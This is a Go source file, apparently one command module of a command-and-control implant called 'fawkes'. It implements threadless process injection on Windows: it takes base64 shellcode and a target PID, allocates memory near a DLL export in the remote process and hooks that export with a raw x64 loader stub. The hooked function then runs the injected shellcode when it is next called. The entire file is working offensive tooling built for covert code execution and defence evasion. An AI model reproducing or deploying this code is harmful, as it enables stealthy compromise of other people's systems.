//go:build windows
// +build windows

// Threadless injection implementation adapted from:
// https://github.com/dreamkinn/go-ThreadlessInject
// Original technique by CCob: https://github.com/CCob/ThreadlessInject

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	kernel32TI = windows.NewLazySystemDLL("kernel32.dll")

	virtualAllocEx     = kernel32TI.NewProc("VirtualAllocEx")
	virtualProtectEx   = kernel32TI.NewProc("VirtualProtectEx")
	writeProcessMemory = kernel32TI.NewProc("WriteProcessMemory")
	readProcessMemory  = kernel32TI.NewProc("ReadProcessMemory")

	// Loader stub from dreamkinn/go-ThreadlessInject
	// This loader:
	// 1. Pops return address and calculates hooked function address
	// 2. Saves all registers
	// 3. Restores original function bytes (placeholder at 0x12)
	// 4. Calls the shellcode
	// 5. Restores registers and jumps back to the restored function
	shellcodeLoader = []byte{
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90,
	}

	callOpCode  = []byte{0xe8, 0, 0, 0, 0}
	uintsize    = unsafe.Sizeof(uintptr(0))
	oldProtect  = windows.PAGE_READWRITE
	
	// Package-level variables for payload (matching reference)
	payload     []byte
	payloadSize int
)

type ThreadlessInjectCommand struct{}

func (c *ThreadlessInjectCommand) Name() string {
	return "threadless-inject"
}

func (c *ThreadlessInjectCommand) Description() string {
	return "Inject shellcode using threadless injection by hooking a DLL function in a remote process"
}

func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params struct {
		ShellcodeB64 string `json:"shellcode_b64"`
		PID          int    `json:"pid"`
		DLLName      string `json:"dll_name"`
		FunctionName string `json:"function_name"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Shellcode is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform threadless injection
	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *ThreadlessInjectCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func generateHook(originalBytes []byte) {
	// Overwrite dummy 0x887766.. instructions in loader to restore original bytes of the hooked function
	for i := 0; i < len(originalBytes); i++ {
		payload[0x12+i] = originalBytes[i]
	}
}

func findMemoryHole(pHandle, exportAddress, size uintptr) (uintptr, error) {
	remoteLoaderAddress := uintptr(0)
	found := false

	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress+0x70000000; remoteLoaderAddress += 0x10000 {
		ret, _, errVirtualAlloc := virtualAllocEx.Call(
			pHandle,
			remoteLoaderAddress,
			size,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
		if ret != 0 {
			found = true
			break
		}
		_ = errVirtualAlloc
	}

	if !found {
		return 0, fmt.Errorf("could not find memory hole")
	}

	return remoteLoaderAddress, nil
}

func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string) (string, error) {
	var output string

	// Get handle to remote process
	pHandle, errOpenProcess := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if errOpenProcess != nil {
		return output, fmt.Errorf("error calling OpenProcess: %v", errOpenProcess)
	}
	defer windows.CloseHandle(pHandle)

	// Get address of remote function to hook
	DLL := windows.NewLazySystemDLL(dllName)
	remote_fct := DLL.NewProc(functionName)
	exportAddress := remote_fct.Addr()

	// Create payload
	payload = append(shellcodeLoader, shellcode...)
	payloadSize = len(payload)

	// Find memory hole
	loaderAddress, holeErr := findMemoryHole(uintptr(pHandle), exportAddress, uintptr(payloadSize))
	if holeErr != nil {
		return output, fmt.Errorf("error finding memory hole: %v", holeErr)
	}

	// Read original bytes of the remote function
	var originalBytes []byte = make([]byte, 8)
	ret, _, errReadFunction := readProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		uintptr(unsafe.Pointer(&originalBytes[0])),
		uintptr(len(originalBytes)),
		0,
	)
	if ret == 0 {
		return output, fmt.Errorf("error reading function: %v", errReadFunction)
	}

	// Write function original bytes to loader
	generateHook(originalBytes)

	// Unprotect remote function memory
	ret, _, errVirtualProtectEx := virtualProtectEx.Call(
		uintptr(pHandle),
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("error unprotecting function: %v", errVirtualProtectEx)
	}

	// Build hook
	var relativeLoaderAddress = (uint32)((uint64)(loaderAddress) - ((uint64)(exportAddress) + 5))
	relativeLoaderAddressArray := make([]byte, uintsize)
	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)

	callOpCode[1] = relativeLoaderAddressArray[0]
	callOpCode[2] = relativeLoaderAddressArray[1]
	callOpCode[3] = relativeLoaderAddressArray[2]
	callOpCode[4] = relativeLoaderAddressArray[3]

	// Hook the remote function
	ret, _, errWriteHook := writeProcessMemory.Call(
		uintptr(pHandle),
		exportAddress,
		(uintptr)(unsafe.Pointer(&callOpCode[0])),
		uintptr(len(callOpCode)),
		0,
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to hook the function: %v", errWriteHook)
	}

	// Unprotect loader allocated memory
	ret, _, errVirtualProtectEx = virtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("error protecting payload memory: %v", errVirtualProtectEx)
	}

	// Write loader to allocated memory
	ret, _, errWriteLoader := writeProcessMemory.Call(
		uintptr(pHandle),
		loaderAddress,
		(uintptr)(unsafe.Pointer(&payload[0])),
		uintptr(payloadSize),
		0,
	)
	if ret == 0 {
		return output, fmt.Errorf("error writing loader: %v", errWriteLoader)
	}

	// Protect loader allocated memory
	ret, _, errVirtualProtectEx = virtualProtectEx.Call(
		uintptr(pHandle),
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("error protecting loader: %v", errVirtualProtectEx)
	}

	output = fmt.Sprintf("[+] Shellcode injected into PID %d\n", pid)
	output += fmt.Sprintf("[+] Target: %s!%s (0x%x)\n", dllName, functionName, exportAddress)
	output += fmt.Sprintf("[+] Loader at: 0x%x\n", loaderAddress)
	output += "[+] Hook installed. Shellcode will execute when function is called.\n"

	return output, nil
}
